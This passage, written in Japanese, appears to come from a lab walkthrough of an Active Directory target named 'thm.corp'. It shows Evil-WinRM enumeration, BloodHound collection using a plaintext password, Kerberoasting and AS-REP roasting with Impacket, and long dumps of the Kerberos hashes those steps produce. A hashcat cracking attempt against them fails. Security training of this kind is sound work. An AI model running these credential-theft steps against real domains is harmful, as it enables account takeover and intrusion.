LETHA_MAYO               LILY_ONEILL              LINDSAY_SCHULTZ
MARCELINO_BALLARD        MARION_CLAY              MICHEL_ROBINSON
MITCHELL_SHAW            MORGAN_SELLERS           RAQUEL_BENSON
RICO_PEARSON             ROSLYN_MATHIS            SHAWNA_BRAY
STEWART_SANTANA          TABATHA_BRITT            TED_JACOBSON
TRACY_CARVER             TREVOR_MELTON
The command completed with one or more
```

管理者権限を持ってるユーザーの確認
```sh
*Evil-WinRM* PS C:\Users> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
CHRISTINA_MCCORMICK
Domain Admins
Enterprise Admins
MICHEL_ROBINSON
TREVOR_MELTON
The command completed successfully.
```

C:\Users\automadir 以下のフォルダ
```bash
di r*Evil-WinRM* PS C:\Users\automadir -R


    Directory: C:\Users\automate


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/14/2023   8:35 AM                3D Objects
d-r---        6/14/2023   8:35 AM                Contacts
d-r---        7/14/2023   7:28 AM                Desktop
d-r---        7/13/2023   3:49 PM                Documents
d-r---        6/14/2023   8:35 AM                Downloads
d-r---        6/14/2023   8:35 AM                Favorites
d-r---        6/14/2023   8:35 AM                Links
d-r---        6/14/2023   8:35 AM                Music
d-r---        6/14/2023   8:35 AM                Pictures
d-r---        6/14/2023   8:35 AM                Saved Games
d-r---        6/14/2023   8:35 AM                Searches
d-r---        6/14/2023   8:35 AM                Videos


    Directory: C:\Users\automate\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        6/16/2023   4:35 PM             31 user.txt


    Directory: C:\Users\automate\Favorites


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        6/14/2023   8:35 AM                Links
-a----        6/14/2023   8:35 AM            208 Bing.url


    Directory: C:\Users\automate\Links


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/14/2023   8:35 AM            501 Desktop.lnk
-a----        6/14/2023   8:35 AM            946 Downloads.lnk

```

C:\Users\CECILE_WONGフォルダは閲覧できない
```bash
*Evil-WinRM* PS C:\Users> dir CECILE_WONG
Access to the path 'C:\Users\CECILE_WONG' is denied.
At line:1 char:1
+ dir CECILE_WONG
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\CECILE_WONG:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

OSバージョン
- Windows  10.0.17763.0
```bash
*Evil-WinRM* PS C:\Users> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      17763  0


```

インストールされてるソフトウェアについては検索できない
```sh
*Evil-WinRM* PS C:\Users\automate\Documents> wmic product get name
WMIC.exe : ERROR:
    + CategoryInfo          : NotSpecified: (ERROR::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Description = Access denied*Evil-WinRM* PS C:\Users\automate\Documents> Get-WmiObject -Class Win32_Product |  select Name, Version
Access denied 
At line:1 char:1
+ Get-WmiObject -Class Win32_Product |  select Name, Version
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectComman
```


## BloodHound
bloodhound.pyで、情報収集
```sh
sudo bloodhound-python -u 'AUTOMATE' -p 'Passw0rd1' -ns 10.10.73.63 -d  thm.corp -c all
```

Bloodhoundの実行
### Kerberoasting可能なアカウント
![](https://i.imgur.com/CE0ryxF.png)
- MARION_CLAY@THM.CORP
- CYRUS_WHITEHEAD@THM.CORP
- MARCELINO_BALLARD@THM.CORP
	- RDPできる
- DARLA_WINTERS@THM.CORP
- TRACY_CARVER@THM.CORP
- 3811465497SA@THM.CORP
- DEANNE_WASHINGTON@THM.CORP
- FANNY_ALLISON@THM.CORP
- KRBTGT@THM.CORP
	- ゴールデンチケット取れるのでは？
#### Kerberoasting
- TGSを取得する
```sh
└──╼ $cat valid_ad_users
MARION_CLAY
CYRUS_WHITEHEAD
MARCELINO_BALLARD
DARLA_WINTERS
TRACY_CARVER
3811465497SA
DEANNE_WASHINGTON
FANNY_ALLISON
KRBTGT
```

　取得できた
　- KRBTGTのTGSハッシュは取得できなかった
	　- Bloodhoundの推測ミス？？
```
impacket-GetUserSPNs thm.corp/AUTOMATE:Passw0rd1 -dc-ip 10.10.73.63 -usersfile valid_ad_users
Impacket v0.11.0 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[-] CCache file is not found. Skipping...
[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
[+] Trying to connect to KDC at 10.10.73.63:88
[+] Trying to connect to KDC at 10.10.73.63:88
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*MARION_CLAY$THM.CORP$MARION_CLAY*$25744f068e0cb9d3b53f1784b98f8bce$7974e5055c67128b71eb95ddda01e826bf5c41a0f4ac5babdf6a0eeb52209953222c2e0780eebfdb38a069d00daa927492998b6048fa2284feef1c7aeb6bde54fb6c877dc7c5b0912ce083f8f277923651418e6b8213f3771964b575a4d3d6b3c8fc7476b3770bcd87d985cf512ac60582f73cca84dddbda0eea6578a39327d98f1368cd4c51cfad7d2000b93892de735eacfeebe0d1f77dd37730cff011f765311120cd3202de9bcf3ceb1bac272fdccb3171cb25addd1e82721be772bc03a2569923f71c1f7901ee3b7e18b9cad332eebb2a4b14a741adaa6063b42124a8c5a32c7bed5a1db0fad2893b8cd5234aadc88f4734de64ef1901120b123bcc792764c94f70160455763f3ae18a13569a217bd737f09987432aae566d13d2c60d1313e594f139097c55a192d8f4b807907eae9e7920238470ec3e9cb0577e95be66523d4da9db497fea3af46ebf769628a3318070c977e47e2470160c3178c31131ea6c13826e30532091fd803ff1aae546e3ef35f80f8338e8b51d0436740b57233e60ddad33ad5f81d024eb78ad53e3d8edd2da794a4b8c75fba392b42f8d894c2b7742885b26835adc4219d949b49e178c8694f0db3c84d4cbcc4c5ee8bce0a1212fc9ae16ad9f3197ba1150b526f5ddf1b04b36490458771ceb769da8de6556f8bc5e37fd6c127dc6796cdfeb14a8971bed7a3f121736189ebc5a3c2e56da08c7e639cccce5e6fc1e4433cb64f03971174a7bfce038b8e631eee0eff2f6addf9e6cd6250c2dc90fdbbeb41b8f595ca932b8bc9e76c29cde301ea3b10951cb93aed6f87f5b03b1b136109b52aa342d31537512d8bd4c0570a9188bee2ec8821072962cbc3b4192dd4824f06d26ddabe493af9cdf0271e4d95e4bd9267d25a4827e411c14735c32decc09ca91aecd1cab5259af9e340ec1cd19e381feb9ea84678742ab63a0c5ade90e500ba4f2d35603e3ecd69c34e641a8629b38212f53543698265f4b35fe14ea8a0af69f9779adf4225b2f26dbb2722a1fa5c3469eb05f232b31f449071579a7c99f23b1bc943a74dab0d69ef0eb83fabd98d958090fd778e7203026b0f4a7b10ce393d06a65c994c921b9aeb83c906da3db06789e69322e7d590f7bbbafc7cad63d67ef338d3f98c60cdc556f25fddeb5cf5f1f73c5649c8e4c778835b30eaff5453a36e581a84ce9f8459f075ea570a0c35ce44c13670da6e9d7c4f1cda81a1c7e048d6b00a15de400d65869c86445c1fcf8c9a4329822e1af668e3f6a52204c6706e4dd59ceb746efe8ed1cda395d2fd0f0bda3734d389e59167c37c96499b1a589151d555b305c88ec9ec59b6855cd442e79afb173d47f449d39a2341522720a9ff47df85f6bc7c06694ca850b6447965b63456fa610ae03e6d873014a492343f3972e017a02627cf4afce876f1c4c802df33bebadaf94
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*CYRUS_WHITEHEAD$THM.CORP$CYRUS_WHITEHEAD*$067093103e7a194bbc4bbb542d62198f$74b8c1b1d5bb3e00aa89b0402c5210e0cac1d766fc7d23596d091b77fcfd22b82af4be26e34d127a578b84f16be9749009229bc4e3c9fe584e2a8896ecc94887ad62fd8ddfb98f07787f5a95076e17475e16b2754ccce99e64e5179bfc973fcc4b6ec87a5aa8cc737b3892c5d8682a8b051e8ab0325c43e8c679defca0fe88a35cf3916b9310013914208484a470abea6e5a197e29af7ff66861c5c82b014178ceec4c6241593a073adec3d330c400e6bead27647f7aee8dae9357c169a33ec1c9915f0c2b127ef3c2b41fc707e2d111d28ac740af07c7376c9e3af2beffec86c6f55a3bd5e56e5adfa198bec50773195047dfe6b666e214186ca212163df697d6e34624d69ea0ca4463a7e4ae4e703c59df189c62d78ab38bde4f071e30c2df2a6c7c2c43e8cc237c4ca2882e7ec77c68e060f56dd4ad142fe4e6ccd5c6310e689ca5c1b79c0bb414b3403949f375a1333023e70adf8fcdc713c488fadbff7b7b5e2bacaff5a650f0175bb3df0d51839dd8c67a38997b8aa8618af86dee3a2f41fdf0823f74f2a11d11c8b3992269a660cdc8ddc4494d2c0db28f037605732526d60004d7ce8d4ca1b90b38907d1328fb7ce76d1f9bc0baef7d4b10406ab133584c82d1429edc7395ed6525c6a879cac787f31ed5f5a39d1f6df785a4d82ffd5011e806e1cebcc2738faee06c3a0ea1f70e7bfc293a07c084db97811fece41724103856277e2d281330d714bafb87e1230a1e1704b14a1eb6756991c5a0d0e3843e290f47653f31683fde07b306b93023a66bf25ff39a1e1ee6ea35fc6068b896986a47c96a66ebe74e03f16729d04598c139d691abf9de128f923c434e6e5e14f296894d3a7c12412c95c36a026a2f8053ed052f62702fb7ea03637e2b3dec95434f0a034742cb4a79de1755e118b04168235ddabe81946598e518984782c10dd984766600576600d4f7785ce1743932ac901371d9275b157d642cd845ed473b2772986b7352a7b3093bc4320da5934371a5d9ea45fc0ca51f755a74ec7a11f23684c6d11fe6342752d25892607ef89aec3114154db3577a9e0c9c98e9f7964670e9104c3dbcd813ce8777d73775fefd094be27178c35897898dd1aea464c1ce0cc6874bce22fecbc2a58e03fdb3e33ee995069e72fa576942b313113e5e4b4362dae976a385195902c0d52ee28729e91580c7428ea4dfaa0172da12786da6a16fc269535b0fe12f283e04ea86f88daa727545d60639e4ed8f104637870b7892a9ec887dd8cd32a15367bc857bf13d4d58104f88d2ee49b5cdb0983122ce0572daf532461c48368a99a5513f9d80a67297cbd1f4cbef6eaee5d61075aa67b680b049d901b964ebf9b4743d97373d03c3a485b4fd8ec3b621609b8c631738739ba1ab8621052b521c3945e7cf64ed0705f38bdd4af22639decbef6a995570c7db
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*MARCELINO_BALLARD$THM.CORP$MARCELINO_BALLARD*$4eb61056e77450014dddae43287ef058$fcda3eb159dfc948fe98cd39f75f6b27ed54646864aa959b9fd35d67827e27e9bcd728a271b8ed02109ecd16af28deb5e84c41ea64bbffd1090722a9d81718cff1b4f30c7baa1a3a7f612d017eeffc2afbe3c9839d23c49d27397a72723eb4d6796d53e0e68ff7307836951c91412d6e52c2cf7debc764f8a5853088587d8c4aeb2fdaf57768203004ff900b61ad73c23180e9567c0eeb0710b048dba0777959ad00cfc2cd3ad17676cd888301b2dbb99257df00f757de0c2b44b47ed175621fd371781ca639a5c640539e690124d0c90f80e6d5f4619559c5630d46ddb0b46822709c1b70e64f17cbafb1262c27c7358ec0f7c95940f5a03849db007801d0d589f380fa9188eb15c80d43879f9d733e4951d31ac96098698c03749ac28458140c5d770ea02a6014da8a112a422ac33dee7f5abde66c8b22c3eeae68c2212b3a2476cf7f28737b06e83a59504bb3fafdcbcfef968d68d416337b2e3bc5897d4f71d6b2ac4469c44cb1a4090540c155865624f7b05e212c3b3f7fb118161fe5729677e8d42db33435ac26fc948dddc350241b4a17d279a0d4ca41ef040474817ec84607a5f4a9801bcdc3e2e7ffbebf81977a8d7a3b63ed9a616199e16678dbfa258dcf2af70ac9d42864d34ca3a7167011dc9b4efdd9941e6d048caa7a77dc74554a0e6df471a903da1974a7a8624c5e26d8b1c85535a8e0d9f99dc54e5cd9ffd72b1f95eab854deef2c348fbe58c06da9ec2c99ca8868ffca1b167ea86bc89a97b812c4b3969f2ef73d9b2a2ded19025ced4fb8f2128d6a7232298fbbda37c3ec385b63cd06b6eac914ceaaa617a842ec6584e9deb9fef5a2655743c0461cccb236167662cff8adfe9d197e4c53692ec586e9b266901935fb94fc5b39f2490cad831d51b02dc52f06d54f4a489979fed6a271d823f4e655e928e71b4f2c633543b04b59bd17de328680055dda1a6571390db78d410569cbae9a5ff544d2f95aacb304be330abd427485b978514675fb382b9dfda608f65d74adc1d42c165cad98189dfc67087324ff347e98dcbb4ba7c22bd1523e2ed2d9fa28bcbf726e344397baf5addcdda39df2ff5e2694e32cde785eecb9ebb1c2562667bd5c44c94c6fa6cc8dcd2836ea9ebcdff0bdc069e35407ff9ae92c7e405eb4f83e24b10866cadf06ae0ed4d099395c263552a3b186f402850f7807cebe0194e15d30769dff3d5cb7ba204fa7400a21be55fd74528ad1f2198bc2034fede49d6f1102ae2267ed82c9aeb411f19a368091f9a3256a7b6ac9acf49bf4adf59ce53205b00960d4a947027c2a08363b24ae15572dd3b3ec1208832e5f66cb78f35ae31b4a1a19ec3ceb8836b00211eecda62fd3bc1d4188b4f57546f5ac20dc61bb5089350a514cadffbce6e2ac8f38ba36a6764c54a32ea020deef4a3f39f54eae83771b694fe11793
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*DARLA_WINTERS$THM.CORP$DARLA_WINTERS*$62296649261f86a7bde5a28d05171d52$0e0b474064365591d1ed94c604041097d136437754d7ab09c34c12251bcdbfb7be76779d4e0ab6fc182ddb1f6cbc733a3ae28740445c724b069bc8340fc5ef4f7f1b85d8b09cfa7f1bf6034adc08dcea7d794bb9f28f6b5397eb0f218a736249c8f5fb48d073ea0fe6545c03cc3a4887020b4547cfdfd400a16dffca9ba649e61c5287d4e8b4483dafc0ea09dae46094f06d6d0ca77f593080a3f316dd69446c1864a2dd5d5656057b8e1a82056a2f0ad6bbac89f54161466b82633a5f1ce89385d91a3eb6763d4c812481e597cf1aaf8a81a98f359c1fd87155b16c0cde474e8f040a0929111c6f342197b65ec27d246aff2617092e241f56e3751ace680ccca2ebab6699971968b08c382bbc1c215361805321efa7fa8c446f6068e25d26d8c795af5752c4d8295b44ce9a95232104a7713f2402ab29578b8ff49ec990656dcad0d7eda7e4c6e49efdda9f20621db9d5a5bdcebb8ea1a50233dba13483d308c564db545d464188dba79a9ac788241310f64234a3c4630db24a9d8184edda5f8275c34a030c37b2c22ba05dba3b24d8648f6f42f1e99ee8cd3bc30207feb52f55122435c1f59e41b6c84045fc2acdf3ad90259d03a1de36db8ad9e2d217138ee6c6ea4137a2545e83bf73740f711a5a5fe4e4c70b273b10bbd8739ce12560eeaa6b9aedb6069eaef5532995f83fb6a51e2fe11430c972150ed7276472d8048f7b8f61bfdcd1c928ebee753f2d118a1fe399712f3f8ea437679a0ddd41687108485b19ab9e2922c91f94e1e291d433086fbafd26745c5c15eb9b38769d0c64d7e9bac61e3001ee5c6bbe764b4702375b4307307a6df57e3b895ffdb0e57df3203c797bc040a265fc83ee4aff763d53487153c20b6fedab9d29318811e153b5aa8ca422cf64f5a6d62254405a4f8c84192864eba0e2b85f1e2052987e0bde5bd1dac60675cf4c1aece18f70a9eac3fb1355ddad54c11a605835d62a804072794ca57552c2d9dd37578cf0da8b40e2bb8ea74f8ba430f4591cc63941a286d76b0aa25d2b4f7067aa175c6b1522a1b6ab28d69a146a0ff5f7764192434f3c76d3df3a94384701bdeb9dfa801f40b5f55ff8965a3d0572724c9f4df2ce3f6959ddfe721bcd20d47dc58ac6e47adbe24e484af421d20c392dfadf65487a5c65a8267f39c49b4daaecc7e7da48b71c038bc51f2797b07d7f6b97a418da3285a4fc5f61bfc63199f1a41fb4e38fc4a3e0a487d43c37da46bbbc0557816685919ff1ce7578ee8edb0fbffc6409237bef4de04eec31ff779953e779dd0bf66a44458c5918993158663f7bfc3957e8feecba6ff19b68646f742d7364fb7b9f5580c02d78c1dfb67a30e510fad50418782146632ca06186946de9292a64cf86d105f755d9c2f049a8ade5a56b756fe77bc58583d35c1c5b60ca64a3531668c27415653d09601f
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*TRACY_CARVER$THM.CORP$TRACY_CARVER*$e329273a824912264b1aae1e37e29927$9b49a8146bd4ee077c16efde3b27f9805c9dce557c4854a90ae55e1a7e7b6335ee188ad56db82d18457e16508e23ba3eff1b3e9649a75eb4c2b5dfdd6811bf06370e6106de7e00bbc7095ec8905e32891d65a53e33acdda2fd1c1477ba785b97d08549ce14e47d168c4a1bbf1449c5c9f36889936595124416e4ecf14cc6d23a1cd6e52c677b91fd7f64c679282606a64ba0a32814545b16fc40e1ccc38d5f6b939851f37d9e1207475c3e248ca1548c7b3ac60e7e803b2282fc4f56dae330890fae1cd0947e83f27b6fca855a09f9850b3178fe1c14a981472cb8a0dcb36dfdafed899e47ca900f8c7a2db6c67df691f369531ecef6120125fd54ac589c8ca951fefdf3c459521e12393c37b8b20ccb02f7895d44c4f08d1ca1fbf200b4343d7ca7bd78310debc9581c4c2e061c7daa2276754c6f0faa7ea1941eec7bfbbf2dd30f7a701c38c6a9f6c0159b4e319ae5fc64e0955b2aeb97e1833220d9de4e4836700b89734747528be44b228d0baec5b77d1dcb5916775fede288ef92f69f7ea240ca6c84076242c23632e72ae1ad4966b5f78eb7a92f929cf579976fd9d7ea57150d9a9e581b6ea9ef8b66c6454fd50d917a78206841d2456fba0e0ffdc9ca307043bd9a02e5ea28da55d6c5ee59b81b7e29d5b4db1cfb12d73664be0d4005c97026fea842effa29be560139ac65cceb7e3331ec4c33fe263af17ca75987a4c10f8808037757eb596842e4282c5d099a209032cacf41e7c6eeca7f24790c816c911697d53d17c817f9faf185694209a1b9ab99da197e8c60f0d5a4337a39799d806e638b184cad6da7e036ca1cdb008713bd6ba74848adb07bdab757fa853d48ea88ada61d0ba25a00be9501ce0f972bf4771ab29cc42638661150e56f8817205700f2a3bae0c3e74f933791c614b6ab853bb17af93d5b08586ed362cf068d5486ded12df5afe3a85df1529b35684de8348cbbfe896ae946ae8c8cb012dca92228dece64b0c017cb932fb6ad7466e7676b31d22eef07de692160dc9ed90125e1c99e7fb1ceb34bcc90c885de9f079e6382d66819e0cfc8b83269733b2554d7278e9177e01956b7df956e508f4a86ebb3db4c184fc6f4093e89d93ff2528ff785ee5764e84ec9aa1749e2a078cd0214ab6896c85933d4d326595beb1d094aaf448f517acac3bbfa97d2fd2a74b1c58730f4a566e6f9e4e44d75e3b46778ead941119c6d0f59e1ccd5e3967726ca1c0bbbab2df3ae8fe8d562ef38e27641f1e5dd980bc4d30ae0ce2fa5c7a046b51bf7aa552b14691089898dc5cc1557239dc61b2f868db5b2bb5b284023815f8692fbef42cfd9c8d61811a7e712201b58aeec98dc5b7e005c18675e13e77d479bb5f1f42a75a3d6d1a4a704b8cfdb3db82687edccc6d59ece7e9ca94502f876378bee299c4500ba895417e5c6d19633be6eb531
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*3811465497SA$THM.CORP$3811465497SA*$d8b54bc70aca360bb9e5ddb4a6cd084d$70e946827c1b96d4a0158d04de47d4e8a0f560c990a61f2aea2242ca1586441d9042b5ac8422db8e13a1993b9ac7daf6a0f0a39c70d36fdc013ff3c8588222827bd0423e94691dadb9d63b776c0a97731c4663b4b0d3829d2b792fe45f5047dcea271351dc8845f0d4cb73826be3fef8bcc9a3bc432c3afe3200bd175dd33dab7639d3b65c09e8a83d7608d235c8444107345754d5d14a12ffe6e0b7758e3271d8ccec34c4299f672cc803de6e4b793f629746404203d3d01296e61facc3a13d14924f52116d90db08d4c2ed52131efa4daad8ea3eb7e76d64b2db52f8762cb7959499be3c5d1cd40658c020386976f64d4d24fa6c3b6e7de5e9dd028f38950887bcd37b6da5a6377347e0319441ac99255ae676f3f3d715f140eb2f2beecc2bad2bb1d8024a4817df2f32b9b7ef9208d6783341e998c7d710cc0934a21410f8f7537598ebc9ea3145e39be378b413e25efde98ccdea9009a13e7a11ba29985c2530ff65c32a2e3b6dfe20762a8102209e85ec7d6f0abe53800af1eefa80b51182e56105aab1c965a04c6ee81627207823d2fe64131dd3fc80ed57d5b34a1be58c3ba31c4eeddd0a0d3c4e43ef4d61a9214c1381b26746b354348a76bf33a60e085c9bd92968ede223b231aee8bd94da1fdda4f3b63a1c383ad41512102a6db0683228529755f12803340b4fb8bcb8341dc5ce70d45fe0344fce8ea63de5012ba4c51b76e94a9be1ac91ab72ba0b1e500066b6435ee0cce0964141a5bb0234aacf7391e7d4c7613fd82f218fa467c168b0a219e5bc73938aeb25e24572315409118a8d3922b472fa17cf1d69b302f92303b25434ea233ec2565ceb7ff8207e9f556db6788c5f3276da970f0e9b4b5c924bc15b9e9f4acc535c2867daf45cf6bdb142dc8eb69c1be6d8ad53c56b741cd779c06a898d0cbd839bd7232f29ed163a84b796c99636dd14e78cd2aa243cfc8da0750e653653ff349a0e81f45187e0486ecb73f7c5c33b0b6e4aa7407f16e925c260ab564fcf90d2c86f695e6dcaaaaa14f9d9bfeca821b44e90a52e48e819db661fed0f36df904246b1de04396e044aed2e1b044aebcf1d3ba1cea62cd99a0775e0c7eac5853ef7dbcc27bf435e42a24f52848594930b817d430263032b6a1c235ffce7d7b670d71af642007e7e921e429ff064f40e75b5fea51b810892f1a3ba418d01e5a1d03c4b351322b36742f4f8430b32d21ac3c7c72efc49a535e8a2fa4f0afe43a7187ad0e2cec01c98ae2b2c24e801e8fd2c9bd2fcd87db31d2e9a71e15d5aa9cde146f870e1ff2944153fad49103e48fd21c0440e368c94fe1f48bb02f64165c32cfd0f023d01020cdd2881f568a584f688524d1e742f94cb59bc5768fc6119a46580b577817f29136ff19d3475fa82fcd0f556dddc481a3149e0f4eabab7f0a5565152045aa6a61884e4ea
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*DEANNE_WASHINGTON$THM.CORP$DEANNE_WASHINGTON*$1887c478247ba773978ee1a3deac476f$36de0bfc955c5bad0b05e85d78f7f6f3ce9af2257833204c0c9b19c757f29a4b8d66e65e5f0430566697a9d82134e72edd4ac99af08e2c3352c72b8acce374e0268416f9b39624c763101fdc35095c9ba27f00a91c0269cd2f6368aa82220811d30c47ebb38b2fc6fa35026a9dabf63a94b1ceb452ee4efeefe7fb61a5a71c528745dcec6f40f1eca6ac6f64a258c426f950fde5607e6772e3e9adf7ae69c3c47f0dea748b842d7999e8ca082d399fd251fa9b1ecbf8add14d42cb29587c9e8a3c80b7c99e781b2737e93a3682e67f83ad2b53dee2afc67b88b7056df766f26761adb8f7df53e204195d676cb4f1a6e5947c74c7c429f1cf5605d01c898419c7f0588c8a3555575be850298939b23b788638c053c3bac1145c3459f34a137a4c814faa74d0f7d1709df61742f013c03a8b7fb3d0b57c3d77ec0b7e03b38165b485f2db80213d4836d87cbd522929a2e5fe43fe2d114fcaff8565cbb2e0e8332207af0fb61ecfb9d4aa51af26bff63c724bc52affe6a2fc89b3bf7e6d9bff395f569d211bc4ddd1c3bdf3b413741df6fd67a8d8e89e7dd27d5f954c9ba9fa88a273c776de8e12345310fc6a651c375ed112694c2cd520c0f5332f2102f582366eb2af387c7a8c22b4f4eb8be82d40279f0fbd5ee0b62051391fed6906305243684e963e5ef139c12c6d780151e9f7848c42c1aaa5f836594cd3ee2b18724b1629bd9cf1450bb3fbf7cc0822537a15978ab879c65d5eb4f1cbe1f248683c894f47172d901bdf950c2f89979c5157908fac96b75f662cab7d4b759483f0a6431676a38849568cf74b6bcc964e2daf1d40293f829cecbcda56c9670b7f1bc545b928036a8b3a4313d6b2c8fd2b6ca9ef61ab2b4750d2daf526ebaee499430c42106a2ae1dcc1b15214dc2fb491e810d4817cea5908289d5c61f279edec521470d1d80a186454efb335d19b9c1938fa5bdf2ae985c94a82eaccf0eb89ae25e92526e4ee206d8572333888bb6af0d79f3440e034fe5a09ec8524bfb9f42e9dd45d4203659f24cd0e720984ed43da4a79af93fdba2287b2583d3c2f5b90c558b82e05c0dc015b452ad92bdca9d66e7ed22f919902c63bd6093bb01f211dffd4f1ed79ace425f85424d1f9636ea7c81ea15b092ad7b6a7a528b788cd1866ed5655cab7d8981998c70be9b2a11efcd2f7d11aa0def15180594f339a53346fdd87a22e47afb96a004c0afc3125753d33a73336234dcd14487ddac641d42b99d52ac8e4cf71c1936301ae99180b33c3d288c9031ac871cfbb33de7d5206788eda51b1ab26f976623928ccee1f6d64b56584847016769d4b8bffeed2f56cd17fc836ff8795a10e9da345dd4d1c059efd28fcd389c0cba04a2d781fd38218682b65c4a39e8dbeff1e2203ec94af0a5dd10355fa325a97d9a9a374ec2ebd51ff8db56836ab1bc4e5
[+] Trying to connect to KDC at 10.10.73.63:88
$krb5tgs$23$*FANNY_ALLISON$THM.CORP$FANNY_ALLISON*$43be912f1e96765506f97866c890bbd0$c5798a22cce3377070aa8e1b31d4c50aee23e1bc526e66f1a102404bd6332700d0dfab6904d5fab5fd1fe0ccf7ffa46532312d5029d142876f968bebdb9bf9cdd2b8f6d73b05f98aa1dc4d8c123bf7279c0f9bf8ec069557e16d606a85e0b86a87badd28e2a703fce44d0690bcf9f621b0058ca0a57072a918b2b6a91d8c79f22bde1ba63a58a2f4cc11cb0457ed195ef6778ae57c1896f88e29e26593f5d0002570a6ff6e6a0ad77b94138d1b6986b82ad7a105b12b7f0dc63fcb50efeab2a44b94720db8e9e048fbdd035f08b6904c0da21bdc4da1a52544e0d1ca05818018c74dfddbe9f83fd3dfe2c794f79bd098d7c5549f414850df7d9ba0cdc2af3850b21f929f83417cae6839f744b34aba20aeb6186200f6a7d2e22be21054ef7e85dcc8764a4a7997c9921018e55167c794541a4ba7a9ac402a62ae09f33b09f91127dea236635a0a003725464f0997df0e31e2d4652fc543a17fb14c213ed5e66313c148277c79a0d871272d20559ff837d8548a129c4766e16c37e3aab669a37aed45a66437fe0f6e29f362e6bded849299d9cff50f8b22c492131604ee074ad9f90e645c5c1ad013881ad7d32b8a0f9a9a5cc6985c67212d2c416a22592a8eed043b46b0fd07d35e9b5b1d07575bd98d0dce49c80675e9ba5148a1b5b8414478b70b9c9bbfaafff875128dd1ecd9658a3700154dc3d6876f11c53a53b8c481d6d113f212cc7448031992c3ea3b4fcb101f3c6a95f672e19f6890bf2ead090db4029d3d285fad537fa58c0d0c57669a4b4013f1bfd5a97ffe6295eb57758180fb94617a081a8769b0aea372d04835e39a9adc05500829a419631f06d62d8472b30fa1fcffdcd3c872841914bed079c36d8dfb1e958eb5d43254ef330bc1cd32390abb6798d2eea4474bd2c7433eea402b2f084dff55db4483a710e6814ea0b52b4d9a99ecdf59586c6fd3c608322c5f80e480972b1d83b5709f205054869a2803c6a7273f344a00241745726d4be065013cdc5edefb3039f07a68c5a553265c9f3345a8d691413bce4b97e03e3d26b113d2560209a777c5c41f3daa85b8a4ca6fbf795d5cc6aea96d9c2895dac0fdf35f735bb90fba31b91fa40e945737036000f86a66e09f4f525c557147ddefb0dd444aebfefc857f6a5eff64acbc196250a8fe03eb3446ef5c4a63afd10e6665d78eb03966537a4cec70e88a336c57dd8959266167dbfb67bf69b5b6a2d1dca5e5044d7ea2948aca645261b38a49333d87004316bee2d1ed8045f7b94595f8362854ce0b89170196a74031ffff4043df186b84e93977ac53f21ab26c6b632f38625eb449a8d1a12e655e0f82a2cf58622126391aaa2a80c6a278561406980fb151de7e699727b791915e754d40be2f320b923407a2601a73bf8e206bb6c517a5ffbfc4ef23d5383971b1ee55dd85f774a2faf0
[+] Trying to connect to KDC at 10.10.73.63:88

```

クラックするけど、rockyou.txtの中にはない
```sh
hashcat tgs_hash.txt /usr/share/wordlists/rockyou.txt

<SNIP>
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
<SNIP>

```


### AS-REP Roasting可能なアカウント
![](https://i.imgur.com/aWuSmV1.png)

- ERNESTO_SILVA
- TABATHA_BRITT
- LEANN_LONG

### ASREP Roasting
AS_REPを取得
```sh
└──╼ $impacket-GetNPUsers thm.corp/AUTOMATE:Passw0rd1 -dc-ip 10.10.73.63 -usersfile valid_users
Impacket v0.11.0 - Copyright 2023 Fortra

$krb5asrep$23$ERNESTO_SILVA@THM.CORP:98b8909fa561eec0b0c05d8226be7587$ff2367521799cdc3d91aaa7ce547caca95a79231c27e8ae4fa2bbe51a67485d21d46fed2f6ccba757d24812c975bb98e211b556e3c085ed872a9ae245dab53d3a4585df864edbc8d0776320ecf57388096b6e3a80e54732f84d577d282fb9309cc1210bc1d010ff0736f0350b3c8939a6ace529a8ff0ac88bff738c8f6c2cde7ec90c1e5f2928ae73804ee228db1506a56412eb645562dd2bc6803f26eaf9d4397132136e71adcf2fe9862ddee8728f135b27cdd08493451469ec657a77e6f131287bf8fee03007a92c1ab6bba7db3c9ff37b5f07abef56e470618c86dd44347b75de958
$krb5asrep$23$TABATHA_BRITT@THM.CORP:6c03f42b19b9da0801ec4c1843ef30bb$485180251c7ef43746a8e615398515c403eaaed342eab9ffbb430d5ef359e836fdd0a98e8e465b80b32e2732e847af40a0e01f17d96aeeec02a9c2803eed0f0724ca455b00a77a5b0d51d82b87c75ff24939b57c2d470a9ab82170baf4bb0c897251e261838aea757841e494dfb56de7192722700c5c3b92cce636918c727ac94edaca78d3a31527e805779fda6765fe2094061cf55f7d11ca0502e9ab1c3813cf9b41e9d4eba160ac86ad578df0190ec720c561b974dcde85638d96c5e9f203395b8d301a84d2ae27dd3bb34c24886d6dfeae26435d381692f67fc38fda413c03d79895
